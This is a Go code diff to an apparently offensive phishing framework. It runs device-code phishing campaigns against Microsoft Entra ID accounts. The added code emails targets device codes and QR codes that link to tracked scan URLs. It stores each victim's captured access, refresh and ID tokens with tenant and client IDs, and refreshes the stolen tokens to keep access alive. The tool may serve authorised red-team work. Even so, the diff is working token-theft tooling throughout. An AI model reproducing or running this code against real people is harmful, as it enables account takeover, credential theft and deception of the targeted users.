@@ -2,14 +2,17 @@ package campaigns
 
 import (
 	"context"
+	"encoding/base64"
 	"fmt"
 	"log"
 	"math/rand"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 
+	qrcode "github.com/skip2/go-qrcode"
 	"github.com/bl4cksku11/entraith/internal/mailer"
 	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
 	"github.com/bl4cksku11/entraith/internal/store"
@@ -58,6 +61,10 @@ type Campaign struct {
 	Engine   *devicecode.Engine `json:"-"`
 	CancelFn context.CancelFunc `json:"-"`
 
+	// notify is a buffered channel used to wake SSE subscribers immediately
+	// when new sessions are created (e.g. from a QR scan confirm).
+	notify chan struct{}
+
 	ArtifactsPath string `json:"-"`
 	ExportsPath   string `json:"-"`
 
@@ -65,6 +72,37 @@ type Campaign struct {
 	ResultsByID map[string]*devicecode.TokenResult
 
 	EmailResults []*mailer.EmailSendResult `json:"email_results,omitempty"`
+
+	// QR phishing config — set when the operator sends QR emails.
+	QRBaseURL      string `json:"qr_base_url,omitempty"`
+	QRDCTemplateID string `json:"qr_dc_template_id,omitempty"`
+	QRDCProfileID  string `json:"qr_dc_profile_id,omitempty"`
+}
+
+// NotifyCh returns the channel SSE handlers should select on for push updates.
+func (c *Campaign) NotifyCh() <-chan struct{} { return c.notify }
+
+// GetQRConfig safely returns the QR DC template and profile IDs under the read lock.
+func (c *Campaign) GetQRConfig() (templateID, profileID string) {
+	c.mu.RLock()
+	defer c.mu.RUnlock()
+	return c.QRDCTemplateID, c.QRDCProfileID
+}
+
+// GetStatus returns the campaign status string under the read lock.
+func (c *Campaign) GetStatusStr() string {
+	c.mu.RLock()
+	defer c.mu.RUnlock()
+	return c.Status.String()
+}
+
+// pushNotify sends a non-blocking signal on the notify channel so any SSE
+// handler wakes up immediately and sends a fresh status update.
+func (c *Campaign) pushNotify() {
+	select {
+	case c.notify <- struct{}{}:
+	default:
+	}
 }
 
 type Manager struct {
@@ -146,6 +184,8 @@ func (m *Manager) Load() error {
 				TargetEmail:       t.TargetEmail,
 				RedeemedAt:        t.RedeemedAt,
 				UserPrincipalName: t.UPN,
+				TenantID:          t.TenantID,
+				CapturedClientID:  t.CapturedClientID,
 			}
 			results = append(results, r)
 			byID[r.TargetID] = r
@@ -169,19 +209,23 @@ func (m *Manager) Load() error {
 		}
 
 		c := &Campaign{
-			ID:            row.ID,
-			Name:          row.Name,
-			Description:   row.Description,
-			Status:        status,
-			CreatedAt:     row.CreatedAt,
-			StartedAt:     row.StartedAt,
-			CompletedAt:   row.CompletedAt,
-			ArtifactsPath: row.ArtifactsPath,
-			ExportsPath:   row.ExportsPath,
-			Targets:       tstore,
-			Results:       results,
-			ResultsByID:   byID,
-			EmailResults:  emailResults,
+			ID:             row.ID,
+			Name:           row.Name,
+			Description:    row.Description,
+			Status:         status,
+			CreatedAt:      row.CreatedAt,
+			StartedAt:      row.StartedAt,
+			CompletedAt:    row.CompletedAt,
+			ArtifactsPath:  row.ArtifactsPath,
+			ExportsPath:    row.ExportsPath,
+			notify:         make(chan struct{}, 1),
+			Targets:        tstore,
+			Results:        results,
+			ResultsByID:    byID,
+			EmailResults:   emailResults,
+			QRBaseURL:      row.QRBaseURL,
+			QRDCTemplateID: row.QRDCTemplateID,
+			QRDCProfileID:  row.QRDCProfileID,
 		}
 		m.campaigns[c.ID] = c
 	}
@@ -193,15 +237,18 @@ func (m *Manager) Load() error {
 func (m *Manager) saveCampaign(c *Campaign) {
 	c.mu.RLock()
 	row := store.CampaignRow{
-		ID:            c.ID,
-		Name:          c.Name,
-		Description:   c.Description,
-		Status:        int(c.Status),
-		CreatedAt:     c.CreatedAt,
-		StartedAt:     c.StartedAt,
-		CompletedAt:   c.CompletedAt,
-		ArtifactsPath: c.ArtifactsPath,
-		ExportsPath:   c.ExportsPath,
+		ID:             c.ID,
+		Name:           c.Name,
+		Description:    c.Description,
+		Status:         int(c.Status),
+		CreatedAt:      c.CreatedAt,
+		StartedAt:      c.StartedAt,
+		CompletedAt:    c.CompletedAt,
+		ArtifactsPath:  c.ArtifactsPath,
+		ExportsPath:    c.ExportsPath,
+		QRBaseURL:      c.QRBaseURL,
+		QRDCTemplateID: c.QRDCTemplateID,
+		QRDCProfileID:  c.QRDCProfileID,
 	}
 	c.mu.RUnlock()
 	if err := m.db.UpsertCampaign(row); err != nil {
@@ -217,6 +264,7 @@ func (m *Manager) NewCampaign(id, name, description string) *Campaign {
 		Status:        StatusDraft,
 		CreatedAt:     time.Now().UTC(),
 		Targets:       targets.NewStore(),
+		notify:        make(chan struct{}, 1),
 		ArtifactsPath: filepath.Join(m.artifactsPath, id),
 		ExportsPath:   filepath.Join(m.exportsPath, id),
 		Results:       make([]*devicecode.TokenResult, 0),
@@ -230,12 +278,24 @@ func (m *Manager) NewCampaign(id, name, description string) *Campaign {
 	return c
 }
 
+// NotifySSE wakes any SSE handler watching this campaign so it sends an
+// immediate status update without waiting for the next ticker tick.
+func (m *Manager) NotifySSE(campaignID string) {
+	c, ok := m.GetCampaign(campaignID)
+	if ok {
+		c.pushNotify()
+	}
+}
+
 func (m *Manager) GetCampaign(id string) (*Campaign, bool) {
 	m.mu.RLock()
 	defer m.mu.RUnlock()
 	c, ok := m.campaigns[id]
 	return c, ok
 }
+
+func (m *Manager) ClientID() string  { return m.clientID }
+func (m *Manager) TenantID() string  { return m.tenantID }
 
 func (m *Manager) AllCampaigns() []*Campaign {
 	m.mu.RLock()
@@ -365,17 +425,19 @@ func (m *Manager) collectResults(ctx context.Context, c *Campaign) {
 
 			// Persist token to database
 			if err := m.db.InsertToken(store.TokenRow{
-				CampaignID:   c.ID,
-				TargetID:     result.TargetID,
-				TargetEmail:  result.TargetEmail,
-				AccessToken:  result.AccessToken,
-				RefreshToken: result.RefreshToken,
-				IDToken:      result.IDToken,
-				TokenType:    result.TokenType,
-				ExpiresIn:    result.ExpiresIn,
-				Scope:        result.Scope,
-				UPN:          result.UserPrincipalName,
-				RedeemedAt:   result.RedeemedAt,
+				CampaignID:       c.ID,
+				TargetID:         result.TargetID,
+				TargetEmail:      result.TargetEmail,
+				AccessToken:      result.AccessToken,
+				RefreshToken:     result.RefreshToken,
+				IDToken:          result.IDToken,
+				TokenType:        result.TokenType,
+				ExpiresIn:        result.ExpiresIn,
+				Scope:            result.Scope,
+				UPN:              result.UserPrincipalName,
+				RedeemedAt:       result.RedeemedAt,
+				TenantID:         result.TenantID,
+				CapturedClientID: result.CapturedClientID,
 			}); err != nil {
 				log.Printf("[store] failed to save token for %s: %v", result.TargetEmail, err)
 			}
@@ -467,7 +529,27 @@ func (m *Manager) GetTokenByTargetID(campaignID, targetID string) (*devicecode.T
 		TargetEmail:       row.TargetEmail,
 		RedeemedAt:        row.RedeemedAt,
 		UserPrincipalName: row.UPN,
+		TenantID:          row.TenantID,
+		CapturedClientID:  row.CapturedClientID,
 	}, nil
+}
+
+// sanitizeRefreshScope removes /.default entries from a server-returned scope
+// string. AAD returns the full granted scope list in token responses which can
+// include both explicit scopes and a trailing /.default — sending that combined
+// string back in a refresh request triggers AADSTS70011 invalid_scope.
+func sanitizeRefreshScope(scope string) string {
+	parts := strings.Fields(scope)
+	clean := parts[:0]
+	for _, p := range parts {
+		if !strings.HasSuffix(p, "/.default") {
+			clean = append(clean, p)
+		}
+	}
+	if len(clean) == 0 {
+		return scope // nothing to strip, return original
+	}
+	return strings.Join(clean, " ")
 }
 
 // RefreshToken exchanges the stored refresh_token for new tokens and persists the result.
@@ -480,7 +562,16 @@ func (m *Manager) RefreshToken(campaignID, targetID string) (*devicecode.TokenRe
 		return nil, fmt.Errorf("no refresh token available for target %s", targetID)
 	}
 
-	refreshed, err := devicecode.RefreshAccessToken(context.Background(), m.tenantID, m.clientID, existing.RefreshToken, m.scope)
+	// Use the scope that was actually granted by the server (stored in the token),
+	// falling back to the configured scope. Sending the config scope instead of
+	// the originally-granted scope causes AADSTS70000 invalid_grant errors when
+	// the two differ (e.g. config omits offline_access / openid).
+	scope := sanitizeRefreshScope(existing.Scope)
+	if scope == "" {
+		scope = m.scope
+	}
+
+	refreshed, err := devicecode.RefreshAccessToken(context.Background(), m.tenantID, m.clientID, existing.RefreshToken, scope)
 	if err != nil {
 		return nil, err
 	}
@@ -614,4 +705,300 @@ func (m *Manager) ExportCampaign(campaignID string) (*store.CampaignExport, erro
 		return nil, fmt.Errorf("campaign not found")
 	}
 	return m.db.ExportCampaign(campaignID)
+}
+
+// DeleteTarget removes a target and all its associated data from both memory and DB.
+func (m *Manager) DeleteTarget(campaignID, targetID string) error {
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return fmt.Errorf("campaign not found")
+	}
+
+	c.Targets.Remove(targetID)
+
+	c.mu.Lock()
+	delete(c.ResultsByID, targetID)
+	c.mu.Unlock()
+
+	return m.db.DeleteTarget(campaignID, targetID)
+}
+
+// LaunchForTarget starts the device code flow for a single target in a running campaign.
+func (m *Manager) LaunchForTarget(campaignID, targetID string) error {
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return fmt.Errorf("campaign not found")
+	}
+
+	c.mu.RLock()
+	status := c.Status
+	engine := c.Engine
+	cancelFn := c.CancelFn
+	c.mu.RUnlock()
+
+	if status != StatusRunning {
+		return fmt.Errorf("campaign is not running")
+	}
+	if engine == nil {
+		return fmt.Errorf("campaign engine not initialized")
+	}
+
+	t, ok := c.Targets.GetByID(targetID)
+	if !ok {
+		return fmt.Errorf("target not found")
+	}
+
+	ctx := context.Background()
+	if cancelFn != nil {
+		// Use a child context so cancelling doesn't kill just this target's polling
+		_ = ctx
+	}
+
+	dcr, err := engine.RequestDeviceCode(ctx, t.ID, t.Email)
+	if err != nil {
+		return fmt.Errorf("requesting device code: %w", err)
+	}
+
+	m.db.UpsertDeviceCode(store.DeviceCodeRow{
+		DeviceCode:      dcr.DeviceCode,
+		CampaignID:      campaignID,
+		TargetID:        dcr.TargetID,
+		TargetEmail:     dcr.TargetEmail,
+		UserCode:        dcr.UserCode,
+		VerificationURI: dcr.VerificationURI,
+		ExpiresIn:       dcr.ExpiresIn,
+		IntervalSec:     dcr.Interval,
+		Message:         dcr.Message,
+		IssuedAt:        dcr.IssuedAt,
+		ExpiresAt:       dcr.ExpiresAt,
+	})
+
+	engine.StartPolling(ctx, targetID)
+	return nil
+}
+
+// RegenerateCode deletes the existing device code for a target and issues a new one.
+func (m *Manager) RegenerateCode(campaignID, targetID string) error {
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return fmt.Errorf("campaign not found")
+	}
+
+	c.mu.RLock()
+	status := c.Status
+	engine := c.Engine
+	c.mu.RUnlock()
+
+	if status != StatusRunning {
+		return fmt.Errorf("campaign is not running")
+	}
+	if engine == nil {
+		return fmt.Errorf("campaign engine not initialized")
+	}
+
+	t, ok := c.Targets.GetByID(targetID)
+	if !ok {
+		return fmt.Errorf("target not found")
+	}
+
+	if err := m.db.DeleteDeviceCodeForTarget(campaignID, targetID); err != nil {
+		return fmt.Errorf("deleting existing device code: %w", err)
+	}
+
+	ctx := context.Background()
+	dcr, err := engine.RequestDeviceCode(ctx, t.ID, t.Email)
+	if err != nil {
+		return fmt.Errorf("requesting new device code: %w", err)
+	}
+
+	m.db.UpsertDeviceCode(store.DeviceCodeRow{
+		DeviceCode:      dcr.DeviceCode,
+		CampaignID:      campaignID,
+		TargetID:        dcr.TargetID,
+		TargetEmail:     dcr.TargetEmail,
+		UserCode:        dcr.UserCode,
+		VerificationURI: dcr.VerificationURI,
+		ExpiresIn:       dcr.ExpiresIn,
+		IntervalSec:     dcr.Interval,
+		Message:         dcr.Message,
+		IssuedAt:        dcr.IssuedAt,
+		ExpiresAt:       dcr.ExpiresAt,
+	})
+
+	engine.StartPolling(ctx, targetID)
+	return nil
+}
+
+// SendEmailToTarget sends a phishing email to a single target's active session.
+func (m *Manager) SendEmailToTarget(campaignID, targetID string, profile *mailer.SenderProfile, tmpl *mailer.EmailTemplate) (*mailer.EmailSendResult, error) {
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return nil, fmt.Errorf("campaign not found")
+	}
+	if c.Engine == nil {
+		return nil, fmt.Errorf("campaign not launched — no device codes available yet")
+	}
+	snap, ok := c.Engine.GetSession(targetID)
+	if !ok {
+		return nil, fmt.Errorf("no active session for target %s", targetID)
+	}
+	name := ""
+	if t, ok := c.Targets.GetByID(targetID); ok {
+		name = t.DisplayName
+	}
+	data := mailer.TemplateData{
+		UserCode:    snap.UserCode,
+		RealURL:     snap.VerificationURI,
+		TargetEmail: snap.TargetEmail,
+		TargetName:  name,
+	}
+	err := mailer.Send(profile, tmpl, data)
+	res := &mailer.EmailSendResult{
+		TargetID:    snap.TargetID,
+		TargetEmail: snap.TargetEmail,
+		SentAt:      time.Now().UTC(),
+		Success:     err == nil,
+	}
+	if err != nil {
+		res.Error = err.Error()
+	}
+	m.db.InsertEmailResult(store.EmailResultRow{
+		CampaignID:  campaignID,
+		TargetID:    res.TargetID,
+		TargetEmail: res.TargetEmail,
+		SentAt:      res.SentAt,
+		Success:     res.Success,
+		Error:       res.Error,
+	})
+	c.mu.Lock()
+	c.EmailResults = append(c.EmailResults, res)
+	c.mu.Unlock()
+	return res, nil
+}
+
+// SetQRConfig stores QR phishing config on a campaign and persists it.
+func (m *Manager) SetQRConfig(campaignID, baseURL, dcTemplateID, dcProfileID string) error {
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return fmt.Errorf("campaign not found")
+	}
+	c.mu.Lock()
+	c.QRBaseURL = baseURL
+	c.QRDCTemplateID = dcTemplateID
+	c.QRDCProfileID = dcProfileID
+	c.mu.Unlock()
+	m.saveCampaign(c)
+	return nil
+}
+
+// SendQREmails generates a QR code per target and sends the QR phishing email.
+// It also creates qr_scan tracking rows for each target.
+// If filterTargetID is non-empty, only that specific target is emailed (selective send).
+func (m *Manager) SendQREmails(campaignID string, profile *mailer.SenderProfile, qrTmpl *mailer.EmailTemplate, dcTemplateID, dcProfileID, baseURL, filterTargetID string) ([]*mailer.EmailSendResult, error) {
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return nil, fmt.Errorf("campaign not found")
+	}
+
+	// Store QR config on campaign so the scan handler can find it later.
+	c.mu.Lock()
+	c.QRBaseURL = baseURL
+	c.QRDCTemplateID = dcTemplateID
+	c.QRDCProfileID = dcProfileID
+	c.mu.Unlock()
+	m.saveCampaign(c)
+
+	allTargets := c.Targets.All()
+	if len(allTargets) == 0 {
+		return nil, fmt.Errorf("no targets in campaign")
+	}
+	// Selective send: filter to just one target if requested
+	if filterTargetID != "" {
+		filtered := allTargets[:0]
+		for _, t := range allTargets {
+			if t.ID == filterTargetID {
+				filtered = append(filtered, t)
+				break
+			}
+		}
+		if len(filtered) == 0 {
+			return nil, fmt.Errorf("target %s not found in campaign", filterTargetID)
+		}
+		allTargets = filtered
+	}
+
+	results := make([]*mailer.EmailSendResult, 0, len(allTargets))
+	now := time.Now().UTC()
+
+	for _, t := range allTargets {
+		// Generate unique scan token (UUID-style using random bytes)
+		token := newToken()
+		scanURL := strings.TrimRight(baseURL, "/") + "/qr/" + token
+
+		// Generate QR code PNG and embed as base64 data URL
+		qrImgTag, err := makeQRImgTag(scanURL)
+		if err != nil {
+			log.Printf("[qr] failed to generate QR for %s: %v", t.Email, err)
+			qrImgTag = ""
+		}
+
+		// Persist scan tracking row
+		m.db.UpsertQRScan(store.QRScanRow{
+			Token:       token,
+			CampaignID:  campaignID,
+			TargetID:    t.ID,
+			TargetEmail: t.Email,
+			CreatedAt:   now,
+		})
+
+		// Send QR email
+		data := mailer.TemplateData{
+			TargetEmail: t.Email,
+			TargetName:  t.DisplayName,
+			QRCode:      qrImgTag,
+		}
+		err = mailer.Send(profile, qrTmpl, data)
+		res := &mailer.EmailSendResult{
+			TargetID:    t.ID,
+			TargetEmail: t.Email,
+			SentAt:      now,
+			Success:     err == nil,
+		}
+		if err != nil {
+			res.Error = err.Error()
+		}
+		m.db.InsertEmailResult(store.EmailResultRow{
+			CampaignID:  campaignID,
+			TargetID:    res.TargetID,
+			TargetEmail: res.TargetEmail,
+			SentAt:      res.SentAt,
+			Success:     res.Success,
+			Error:       res.Error,
+		})
+		results = append(results, res)
+	}
+
+	c.mu.Lock()
+	c.EmailResults = append(c.EmailResults, results...)
+	c.mu.Unlock()
+	m.saveCampaign(c)
+	return results, nil
+}
+
+// makeQRImgTag generates a QR code PNG for url and returns an HTML <img> tag
+// with the image embedded as a base64 data URL.
+func makeQRImgTag(url string) (string, error) {
+	png, err := qrcode.Encode(url, qrcode.Medium, 256)
+	if err != nil {
+		return "", err
+	}
+	b64 := base64.StdEncoding.EncodeToString(png)
+	return `<img src="data:image/png;base64,` + b64 + `" alt="Scan QR code" style="width:220px;height:220px;display:block">`, nil
+}
+
+// newToken returns a random 32-hex-char token.
+func newToken() string {
+	b := make([]byte, 16)
+	rand.Read(b)
+	return fmt.Sprintf("%x", b)
 }
